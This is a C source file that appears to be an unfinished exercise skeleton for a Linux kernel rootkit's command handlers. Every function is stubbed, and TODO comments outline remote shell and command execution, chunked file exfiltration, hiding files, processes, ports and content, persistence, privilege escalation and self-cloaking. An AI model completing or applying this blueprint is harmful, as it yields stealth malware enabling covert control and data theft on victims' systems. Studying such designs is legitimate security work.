// SPDX-License-Identifier: GPL-2.0
// execution/commands.c - Individual command handlers.
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/string.h>
#include "rootkit.h"

/*
 * TODO: Implement cmd_ping.
 * Send "PONG" via rk_send_response.
 */
int cmd_ping(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement cmd_status.
 * Send "OK" via rk_send_response.
 */
int cmd_status(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement cmd_info.
 * Send "INFO OK" via rk_send_response.
 */
int cmd_info(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement cmd_shell.
 * Call rk_start_interactive, send "SHELL OK".
 */
int cmd_shell(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement cmd_exec.
 * Validate arg is present, call rk_start_exec(arg), send "EXEC OK".
 */
int cmd_exec(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement cmd_download.
 *
 * 1. filp_open the path from arg.
 * 2. kernel_read in RK_CHUNK_SIZE loops.
 * 3. rk_send_sealed each chunk.
 * 4. Send a zero-length sealed frame at EOF.
 * 5. kfree buffer, filp_close.
 */
int cmd_download(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement cmd_hide_file.
 * rk_target_add(&rk_file_targets, arg), send "HIDE FILE OK".
 */
int cmd_hide_file(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement cmd_unhide_file.
 * Parse arg as int index, rk_target_remove(&rk_file_targets, idx).
 * Send "UNHIDE FILE OK".
 */
int cmd_unhide_file(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement cmd_hide_pid, cmd_unhide_pid.
 * Same pattern as file but on rk_pid_targets.
 */
int cmd_hide_pid(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_unhide_pid(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement cmd_hide_content, cmd_unhide_content.
 * Same pattern but on rk_content_targets.
 */
int cmd_hide_content(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_unhide_content(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement cmd_hide_port, cmd_unhide_port.
 * Same pattern but on rk_port_targets.
 */
int cmd_hide_port(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_unhide_port(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement cmd_list.
 *
 * arg is the list name: "FILE", "PID", "CONTENT", or "PORT".
 * Select the matching rk_target_list, spin_lock_irqsave,
 * format entries as "idx name\n", send the result.
 * Send "LIST EMPTY" if the list has no entries.
 */
int cmd_list(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement cmd_persist, cmd_unpersist.
 * Call rk_persist/rk_unpersist, send response.
 */
int cmd_persist(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_unpersist(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement cmd_escalate.
 * Call rk_escalate, send "ESCALATE OK".
 */
int cmd_escalate(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

/*
 * TODO: Implement cmd_cloak, cmd_uncloak.
 * Call rk_cloak/rk_uncloak, send response.
 */
int cmd_cloak(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}

int cmd_uncloak(struct rk_session *s, const char *arg)
{
	return -ENOSYS;
}
